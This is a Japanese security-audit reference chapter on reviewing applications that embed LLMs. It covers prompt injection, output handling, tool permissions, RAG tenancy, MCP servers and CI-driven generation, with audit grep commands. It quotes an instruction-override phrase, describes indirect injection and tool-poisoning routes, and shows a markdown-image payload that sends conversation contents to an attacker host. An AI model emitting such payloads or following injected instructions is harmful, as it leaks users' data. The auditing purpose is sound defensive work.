# AI 機能を持つアプリ

**評価対象が LLM を動かしているとき**に読む。AI で開発したかどうかとは別の話で、
ここで見るのは「作り方」ではなく「**動くときに LLM が入っているか**」になる。

**動かしている場所は 2 通りあり、見る節が違う。**

| 場所 | 例 | 見る節 |
|---|---|---|
| アプリ自身（利用者の操作で呼ぶ） | チャット、要約、問い合わせの自動応答、エージェント | 1〜8 節 |
| アプリの外（CI・定期実行・手で実行するスクリプト） | 記事や商品説明を生成して CMS へ公開する、問い合わせを夜間にまとめて分類する | **9 節**（加えて、生成物を表示する側は 2 節） |

事前の洗い出しの 0 節と 16 節に、呼び出しの置き場がこの 2 つに分かれて出る。**アプリの外の経路は、利用者の入力を受けないので
「AI 機能は無い」と読み飛ばされやすい。** 生成物が人の確認なしに本番の画面に出るなら、そこが攻撃面になる。

観点は OWASP Top 10 for LLM Applications（版は `references/06-frameworks.md` の表）に合わせてある。台帳の観点に書くときの対応は、
LLM01→1 節、LLM02（他の利用者のデータ・ログ）→4 節、LLM03→3 節、LLM04→7 節、LLM05・LLM09→4-2 節、LLM06→5 節、LLM07→5-2 節、
LLM08（システムプロンプト・ツールの定義）→4 節、LLM10→2 節。

モデルが**ツールを呼び、セッションをまたいで記憶を持ち、下流に結果を及ぼす**エージェント構成なら、
OWASP Top 10 for Agentic Applications の観点も併せて見る（3-2 節）。

## まず使っているかを確かめる

事前の洗い出しを使わずに探すなら、SDK の名前と、SDK を使わずに HTTP で直接呼ぶ形の両方を探す。

```bash
grep -rnE --exclude-dir=node_modules \
  -e 'anthropic|openai|@ai-sdk|langchain|llamaindex|generativeai|google[-/.]genai|bedrock|vertexai|ollama|mistralai|groq|openrouter' \
  -e '/v1/chat/completions|/v1/messages|/v1/responses|:generateContent' \
  -e 'modelcontextprotocol|mcp[_-]server|tool_choice|function_call|tools:\s*\[' . | head -30
```

**使っていなければこの資料は不要。** 使っている場合は、次の 2 つで深さが変わる。

| | 見る範囲 |
|---|---|
| 生成して表示するだけ（要約・下書き） | 1・2・4・5 節 |
| **ツールを実行する / 外部データを読む**（エージェント、MCP） | **全節。3 と 6 が本体になる** |

## 1. プロンプトインジェクション

**LLM は命令とデータを同じ入力で受け取る。** 区別する仕組みが原理的に無いため、
データのつもりで渡した文字列が命令として解釈される。これは設定の不備ではなく、
**現在の LLM の性質**で、完全には塞げない。だから「塞げているか」ではなく
**「破られたときに何ができるか」**を見る。

### 直接（利用者が入力する）

利用者が入力欄に「これまでの指示を無視して……」と書く形。自分のセッションの出力が変わるだけなら被害は小さい。
**問題になるのは、その出力が他の場所へ流れるとき**（2 節と 3 節）。

### 間接（外部のデータに混ざる）

**こちらが本体。** LLM に読ませる材料に攻撃者が書き込める経路があるかを探す。
**画像と音声も経路になる。** 画像を読ませる機能（アップロードした写真の説明、書類の読み取り）があれば、
その画像は「データ」ではなく「命令が入りうる入力」として扱う。

- 利用者が投稿した本文、問い合わせ内容、プロフィール
- 取り込んだ Web ページ、PDF、アップロードされたファイル
- **他の利用者が作ったデータ**（レビュー、コメント、共有ドキュメント）
- 外部 API の応答、RSS、Webhook で受け取った内容

```bash
# LLM へ渡す前に、外部由来の値を組み込んでいる箇所
grep -rnE '\$\{[^}]*\}|\.format\(|f"|\+ *(body|content|text|message|input|query)' \
  --include='*.ts' --include='*.py' . | grep -iE 'prompt|message|content' | head -20
```

**見るのは「エスケープしているか」ではない。** LLM に対するエスケープは存在しない。
見るのは**境界の設計**になる。

- 外部由来の文字列が、システムプロンプトと同じ役割で渡されていないか
- 「ここから先は利用者のデータで、命令ではない」と構造で分けているか（役割の分離、区切り）
- **その分離が破られた前提で、次節以降の被害が抑えられているか**

**直し方:** 外部由来の文字列は `user` の役割で、区切りを付けて渡す。そのうえで、被害を抑える側（3 節の権限、2 節の出力の扱い）で塞ぐ。
「指示を無視しないで」とシステムプロンプトに書くだけの対策は、直し方として書かない。

## 2. 出力の取り扱い

**LLM の出力は、外部からの入力と同じ信頼度で扱う。** ここを間違えると、
プロンプトインジェクションが XSS やコード実行に化ける。

| 出力の使い道 | 見るところ |
|---|---|
| 画面に表示 | HTML として解釈していないか（`dangerouslySetInnerHTML` 等）。`references/07-web-vulnerabilities.md` の 1 節 |
| Markdown として描画 | リンクと画像の URL。`javascript:` と、**外部への画像 URL による情報送信**。参照形式のリンク、リンクのプレビュー（展開）、iframe も同じ経路 |
| ログやターミナルに流す | ANSI エスケープなどの制御文字。見えない Unicode（タグ文字、ゼロ幅文字）で、表示と中身を食い違わせる |
| SQL / コマンドを組み立てる | 02 の D-1。**LLM に SQL を書かせて実行する構成は、それ自体が指摘**。実行するなら、読み取り専用のロールか、許可したテーブルに限っているか。生成したコードを実行するサンドボックスに、ネットワークと資格情報が無いか（可視化用のコードの生成・実行で RCE、プロンプトから SQL インジェクションに至った脆弱性が、実際に LLM の枠組みで出ている） |
| 別の API へ渡す | SSRF（07 の 5 節）。宛先を LLM に決めさせていないか |
| ファイルに書く / 保存する | パストラバーサル。格納型 XSS の経路（07 の 1-4） |

**Markdown の画像は見落とされやすい。** `![](https://攻撃者/?d=<会話の内容>)` を出力させると、
描画した時点で送信される。利用者が何もクリックしなくても起きる。

**CSP で画像の送り先を絞っていても、許可したドメインが中継に使えれば抜ける。** `img-src` /
`connect-src` の許可リストに、**任意の URL へ転送できるもの（オープンリダイレクト、画像のプロキシ）が
入っていないか**を見る。

```bash
grep -rnE 'react-markdown|marked|markdown-it|remark|rehype-raw|urlTransform|unfurl|linkPreview' \
  --include='*.ts' --include='*.tsx' --include='*.js' . 2>/dev/null | grep -v node_modules | head
```

**LLM が生成したコードを、そのまま実行・保存・出荷していないか。** アプリが利用者の求めに応じてコードを生成し、
それを**サンドボックス無しで実行する**、または**そのまま成果物として渡す**構成は、この節の対象になる。

**直し方:** 描画は許可リスト方式の無害化（DOMPurify など）を通し、Markdown の描画部品で画像とリンクの URL を
許可したドメインと `https` に絞る（react-markdown なら `urlTransform`、外部画像を出さないなら `img` 要素を描画しない）。
SQL は LLM に書かせず、決まった問い合わせの引数だけを選ばせる。

## 3. 権限の広さ（Excessive Agency）

**LLM がツールを呼べる構成では、ここが最大の論点になる。** インジェクションが成立した瞬間に、
**そのツールでできることが全部できる**と考える。

### 数える

```bash
# 定義されているツール・関数の一覧
grep -rnE 'name:\s*["'"'"'][a-z_]+["'"'"']' --include='*.ts' --include='*.py' . \
  | grep -iE 'tool|function' | head -30
# 登録の書き方は SDK ごとに違う。上で拾えないもの
grep -rnE 'tool\(\{|tools:\s*\{|@tool|@function_tool|server\.tool\(|registerTool\(|@mcp\.tool|FastMCP' \
  --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head -30
```

ツール 1 つずつに、次を確認する。

- **参照だけか、状態を変えるか。** 変えるものは、それ単体で指摘の候補になる
- **誰の権限で動くか。** 呼び出した利用者の権限か、システムの権限（特権鍵）か。
  **後者なら、利用者が自分では触れないデータにも到達できる**
- **人の承認を挟むか。** 送信・購入・削除・公開に承認が無ければ、インジェクションで実行できる
- **上限があるか。** 呼び出し回数、金額、対象件数

**「ツールは 3 つだけだから安全」は成り立たない。** DB を検索するツール 1 つでも、
条件を LLM に組み立てさせていれば、他人のデータに届く。

**3 つが揃う構成を最初に見る。** 次の 3 つを**同時に**持つエージェントには、操作ごとに人の承認を必須にする
（OWASP の LLM01 の対策が求めている）。

- (A) 信頼できない入力を読む（問い合わせ本文、Web ページ、メール、課題票）
- (B) 機密データに触れる
- (C) 状態を変える、または外部と通信する

2 つだけなら、残るリスクを明示して評価する。**資格情報と状態変更の能力は、モデルではなくアプリのコードが持ち、
ツールの引数を決まった規則で検証し直す。** 承認画面には要約ではなく**実際に実行される内容**を出しているか
（見えない文字で、表示と実行内容を食い違わせる手口がある）。

### 判定の目安

| | 判定 |
|---|---|
| 参照のみ・利用者の権限・件数制限あり | 問題なし（維持すべき実装として記録） |
| 状態を変える・承認なし | **問題あり。** インジェクションで実行できる |
| システム権限で動く・対象を LLM が決める | **問題あり。** 優先度は `references/04-findings-register.md` の問いで引く。第三者の入力（問い合わせ本文、Web ページ）が届くなら問い 1 で P0 |

**直し方:** ツールの中で、ログイン中の利用者の ID をサーバー側のセッションから取り、その利用者の権限で問い合わせる
（BaaS なら利用者のトークンで呼び、RLS を通す）。LLM には対象の ID や検索条件の自由な文字列を決めさせない。
状態を変えるツールは、実行前に、実際の引数を出した確認画面で利用者に承認させる。

### 3-2. エージェント構成で追加で見るもの（Agentic Top 10）

ほかの節で覆えていないものとして、次を確かめる。エージェントが使う資格情報が、委任した利用者の権限より広くないか。
長期の記憶への書き込みを特権操作として扱い、誰の入力で書かれたかを記録し、他の利用者の文脈に出さないか。
エージェント同士のやり取りの認証、呼び出しの連鎖の回数と費用の上限、停止の手段と振る舞いの記録があるか。

## 4. 漏れてはいけないものが文脈に入っていないか（Hidden Context Exposure）

LLM に渡した内容は、**出力として出てくる可能性がある**と考える。
利用者に見せない制御用の文脈（システムプロンプト、開発者の指示、検索で取ってきた方針文、ツールの定義）が出るのは LLM08、
**他の利用者のデータや個人情報が出るのは LLM02** の側になる。台帳で当てはめるときは、この 2 つを分けて書く。

- システムプロンプトに秘密（鍵、内部 URL、他社名）を書いていないか。**システムプロンプトは
  漏れる前提で書く**。「これを教えてはいけない」と書いても、守られる保証は無い
- **他の利用者のデータが文脈に入っていないか。** 検索結果をそのまま渡す構成で、
  絞り込みが LLM 任せになっていると混ざる
- 会話履歴の保存先と保持期間。個人情報が入るなら `references/08-privacy-compliance.md` の 4 節
- **会話履歴を返す API が、持ち主を確かめているか。** `/api/chat/<会話の ID>` のような取得で、ID が自分の会話のものかを
  サーバーで確かめていなければ、ID を変えるだけで他人の会話が読める（`references/02-code-audit.md` の A-3 と同じ形）。
  直し方は、取得の条件に持ち主の ID（セッションから取ったもの）を加えること
- **応答のキャッシュのキーに、利用者やテナントが入っているか。** 入力の文面だけをキーにすると、別の利用者の文脈で
  作られた応答（その人の個人情報を含む）が、同じ質問をした人に返る
- **アプリのログにプロンプトや応答の全文を出していないか**（`console.log(messages)`、`logger.info(prompt)` など）。
  ホスティングのログは保持期間と閲覧できる人が別に決まっていて、会話履歴の管理の外に個人情報が残る。
  直し方は、全文の出力を消し、件数・トークン数・会話の ID だけを出すこと
- **LLM の観測ツール**（Langfuse、LangSmith など）は、既定でプロンプト・応答・取得した文書をすべて記録する。
  保存先・保持期間・閲覧できる人を、会話履歴と同じ重さで見る
- **会話の共有リンクがあるなら、検索エンジンに載らない指定（`noindex`）と、推測できない URL か。**
  共有された会話が検索エンジンに索引されると、誰でも読める
- **LLM の事業者が、送ったデータを学習に使わない設定・契約になっているか。** 送信が公表している内容（委託先・越境移転）と
  合っているか（08 の 5 節）。設定は事業者のコンソールにあるので、依頼者に `templates/client-console-checklist.md` の 10 で聞く

```bash
grep -rnE 'langfuse|langsmith|LANGCHAIN_TRACING|helicone|shareUrl|sharedUrl|/share/' \
  --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head
# .env は名前だけ（値を出さない）
grep -rhoE '^(LANGFUSE|LANGSMITH|LANGCHAIN|HELICONE)[A-Z_]*' .env* 2>/dev/null | sort -u
```

## 4-2. 検索（RAG）とベクトル DB（Vector and Embedding Weaknesses / Data Poisoning）

**文書を検索して LLM に渡す構成では、権限の境界が検索の中にある。** ここが崩れると、
LLM がどれだけ堅くても他人の文書が文脈に入る。

- **テナントや権限の絞り込みを、検索の条件の中でしているか。** 検索した後で絞る方式だと、件数・スコア・
  応答時間から他の文書の有無が推測できる
- **絞り込みの条件をクライアントから受け取っていないか。** クライアントが送ってきた範囲は、提案であって制御ではない。
  テナントの ID はサーバーのセッションから取る
- 権限を**文書単位ではなくチャンク単位**で持っているか（1 つの文書の一部だけが機密、はよくある）
- 信頼度の違うデータ（外部の Web、社内の機密、取引先のデータ）を 1 つのインデックスに混ぜていないか
- 類似度のスコアをそのまま返していないか。**文書が存在するかどうかを調べる手段**になる
- **埋め込みを元の文書と同じ機密度で扱っているか**（埋め込みから元の文章を復元する手法がある）。元の文書を消したとき、埋め込みも消えるか
- **誰が検索対象に文書を入れられるか。** 利用者が投稿した文書がそのまま検索対象に入るなら、それは他の利用者への
  間接インジェクションの経路になる（LLM05）
- **利用者のデータでモデルを追加学習（ファインチューニング）していないか。** 学習に入った内容は、テナントの絞り込みの
  外で、別の利用者への出力に出てくることがある。権限の境界を検索の条件で守れないので、学習に入れた個人データの範囲と
  利用目的（`references/08-privacy-compliance.md` の 4 節）を確かめる

```bash
grep -rnE 'similarity|match_documents|embedding|pgvector|pinecone|qdrant|weaviate|chroma|milvus|namespace|filter:' \
  --include='*.ts' --include='*.py' --include='*.sql' . 2>/dev/null | grep -v node_modules | head -20
```

**Supabase で `match_documents` のような検索用の関数を使っているなら、それが定義者権限（security definer）で
動いていないか**を `references/03-runtime-verification.md` の 1 節で確かめる。定義者権限なら RLS を迂回して、
全テナントの文書が検索対象になる。直し方は、関数を呼び出し側の権限（security invoker）にするか、
関数の中でテナントの条件を `auth.uid()` から引くこと。

## 5. 費用と濫用（Unbounded Consumption）

**LLM の呼び出しは 1 回ごとに費用が出る。** `references/02-code-audit.md` の F-1 と同じ観点だが、
桁が違うことがある。

- **認証なしで LLM を呼べる経路があるか。** あれば、それだけで指摘（F-1）
- 1 回の入力長に上限があるか。無ければ、長文を投げるだけで費用が伸びる
- 利用者あたり・時間あたりの回数制限があるか
- **上限に達したときどうなるか。** 失敗として返すのか、静かに止まるのか、課金が伸び続けるのか
- 使用量の監視と通知があるか。**気づく仕組みが無いことのほうが、単価より重い**。事業者のコンソールの月額の上限と
  通知の設定は、依頼者に `templates/client-console-checklist.md` の 10 で聞く

**直し方:** LLM を呼ぶ経路にログインを必須にし、利用者ごとの回数制限（F-1 と同じ仕組み）、入力長の上限、
`max_tokens` を付ける。事業者のコンソールで月額の上限と通知を設定する。

## 5-2. 出力が判断や操作を駆動するとき（Misinformation）

見るのは、**LLM の出力が、人の判断や次の処理をそのまま決めていないか**。

- 出力が**ツール呼び出しの引数**になる（検索条件、送信先、金額）
- 出力が**画面の判定結果**として表示される（「この申請は承認できます」）
- 出力が**別のシステムへの入力**になる（下流の API、DB の更新）

**流暢な出力は、間違っていてもそう見えない。** 人の確認が挟まっているか、無ければ出力の妥当性をどう検証しているか
（構造化出力のスキーマ検証、値の範囲の確認、根拠の提示）を確かめる。**「確認は利用者がする」と書いてあっても、
画面がそう作られていなければ確認は起きない。**

## 6. MCP・外部ツールサーバー

**接続している MCP サーバーは、1 つ 1 つが信頼境界になる。**

```bash
# 接続先の設定
find . -name '*mcp*.json' -o -name '.mcp.json' -o -name 'claude_desktop_config.json' 2>/dev/null \
  | grep -v node_modules
grep -rnE '"command":|"args":|"url":' --include='*mcp*.json' . 2>/dev/null | head -20
```

- **接続先はどこか。** 自社のものか、第三者が配布しているものか。版は固定されているか
- **ツールの説明文（description）が信頼できるか。** 説明文は LLM の文脈に入る。
  攻撃者が書き換えられる場所にあれば、そこから指示を注入できる（Tool Poisoning）
- **ツールの応答が信頼できるか。** 外部のデータ（課題票、コメント、Web ページ）を返すツールは、
  その中身が間接インジェクションの経路になる
- サーバーに渡している資格情報の範囲。**読み取り専用のトークンで足りないか**

**接続先が増えるほど境界が増える。** 1 つ侵されると、エージェント全体が乗っ取られる。
使っていないサーバーが設定に残っていないかも見る。

**後から中身が変わる前提で見る。** 承認した後にサーバーの設定やツールの説明文が書き換えられることも、
配布されたサーバーがある版から悪意のある動作を始めることもある。`npx -y <パッケージ>` のように版を固定せずに
取ってくる定義は、それだけで指摘の候補になる。直し方は、版を固定し（`npx -y <パッケージ>@<版>`）、
使っていないサーバーを設定から外し、トークンを必要な範囲に絞ること。使っているクライアントやサーバーに
重大な脆弱性の勧告が出ていないかは、`references/10-dependencies.md` の手順で確かめる。

### 6-2. アプリが MCP サーバーを提供している場合

MCP の仕様では認可は任意だが、**認可を実装せずに、機微なデータや操作を HTTP で公開しているなら、それ自体が指摘になる。**
認可を実装しているなら、仕様が求める次の点を確かめる（細目は仕様の現行版で確かめる）。

- **トークンが自分宛て（audience）に発行されたものかを検証する。** 受け取ったトークンを下流の API へそのまま転送しない
- 第三者の API を中継し、固定の client ID を使うサーバーは、クライアントごとの同意画面を持つ（confused deputy 対策）
- **セッション ID や状態の値を、認証の代わりに使っていないか**
- `localhost` で待ち受けるサーバーも認証を必須にする。**`0.0.0.0` で待ち受けていないか**、DNS リバインディングに備えているか

```bash
grep -rnE 'McpServer|StreamableHTTPServerTransport|FastMCP|oauth-protected-resource|WWW-Authenticate|Mcp-Session-Id|0\.0\.0\.0' \
  --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head
# 受け取った Authorization をそのまま下流へ渡していないか
grep -rnE 'Authorization.*(req|request)\.headers' --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head
```

## 9. アプリの外で LLM を動かす経路（CI・定期実行・スクリプト）

**アプリの画面からは見えないが、生成物はアプリの画面に出る。** 見るのは、入力の出どころ・生成物の行き先・
途中で人が確かめるか・持たせた鍵・回数と費用の上限の 5 つになる。

| 見るもの | 問題ありにする形 | 関係する節 |
|---|---|---|
| 入力の出どころ | 外部の Web ページ、利用者の投稿、受信したメールなどを取り込む（間接的なプロンプトインジェクションの入口。1 節） | 1 節 |
| 生成物の行き先 | HTML・Markdown・リンク・画像の URL を、**人の確認なしに** CMS・DB・リポジトリへ書き込み、本番の画面に出る | 2 節、07 の 1-3 |
| 無害化の場所 | **書き込む側の正規表現の除去だけ**（`<script>` を消す、引用符で囲んだ `on*` を消す）。`javascript:` の URL、引用符の無い属性、`iframe`・`form`・`meta` が残る。**描画する側で、許可リスト方式の無害化を通しているか**を見る | 07 の 1-3 |
| 鍵の範囲 | 生成のために CMS の**書き込み**の鍵を持つ。その鍵を、通知の認証やアプリの読み取りにも流用する（02 の C 節の「用途の分離」） | 02 の C 節 |
| 鍵の置き場 | ジョブ全体の `env:` に LLM の鍵や書き込みの鍵を置き、第三者の Action を含む全ステップに渡す。手動実行の入力を `run:` に直接入れる | 10 の 3-3 |
| 回数と費用の上限 | 手動実行で本数を指定できるのに上限が無い。1 回の実行での呼び出しの回数・`max_tokens`・ジョブの時間の上限が、費用として許せる額になっていない | 5 節 |
| 失敗と異常の通知 | 生成が止まった・大量に公開された・審査の LLM が全部通した、に気づく仕組みが無い | 5 節 |

**「審査の LLM を通している」は人の確認の代わりにならない。** 審査の LLM も同じ入力に影響され、出力の安全さ（スクリプトの混入）を
判定する作りになっていないことが多い。公開前に人が確かめないなら、描画する側の無害化と CSP が最後の防御になる。

**生成物は、それを表示するオリジンの攻撃面になる。** 管理画面と公開ページが同じオリジンで、セッションを JS から読める構成なら、
記事の本文に 1 度スクリプトが入るだけで運営のセッションに届く（02 の B-2）。指摘の重さはこの組み合わせで決める。

**直し方:** 描画する側で許可リスト方式の無害化を通す（書き込む側の除去は残してよいが、それに頼らない）。生成物は下書きとして
書き込み、人が公開する流れにする。鍵は使うステップの `env:` だけに置き、書き込みの鍵をほかの用途に流用しない。

内容の正しさ（誤った情報、景品表示法・ステルスマーケティング・著作権）は、この評価の判定の対象ではない。目に付いたものは
台帳の「気づいたこと」に事実だけを書く（`references/08-privacy-compliance.md` の 6 節）。

```bash
# 生成物を書き込む先（CMS・DB・リポジトリ）。スクリプトとワークフローを読む
grep -rnE 'method:[[:space:]]*["'"'"'](PUT|POST|PATCH)|\.(insert|upsert|update)\(|git (commit|push)|contents/' scripts .github 2>/dev/null | head -20
# 描画する側。CMS の本文を HTML として出している箇所
grep -rnE 'dangerouslySetInnerHTML|v-html|\{@html|\|[[:space:]]*safe|html_safe|raw\(' --include='*.tsx' --include='*.jsx' --include='*.vue' --include='*.svelte' --include='*.erb' --include='*.html' . 2>/dev/null | grep -v node_modules | head -20
```

## 指摘の書き方

**「プロンプトインジェクションの可能性がある」だけでは指摘にならない。** 可能性は常にある。
書くのは**経路と、成立したときにできること**になる。

```markdown
| 事実 | 問い合わせ本文（第三者が投稿できる）を、要約用のプロンプトへそのまま
        埋め込んでいる。<path>。ツールとして「顧客検索」を渡しており、
        検索条件は LLM が組み立てる |
| 影響 | 問い合わせ本文に指示を混ぜることで、投稿者が自分では閲覧権限を持たない
        顧客情報を、要約の形で引き出せる。管理画面の担当者が要約を開いた時点で成立する |
| 判定 | 問題あり（P0。問い合わせは認証なしで投稿でき、第三者が他人の個人情報に到達できる） |
```

**台帳の列との対応**（`references/04-findings-register.md`）: 「事実」は指摘事項、「影響」は想定される影響、「判定」は判定と優先度の列に分けて書く。確認の方法は多くが「コード」で、観測ツールの保存先や保持期間は「依頼者の確認」になる。分類は認可か、記録ツール（LLM の観測ツール）。

**塞ぎ方は「インジェクションを防ぐ」ではなく「権限を狭める」で書く。** 検索条件を
LLM に組み立てさせず、呼び出した担当者の権限で絞った結果だけを渡す、という形になる。
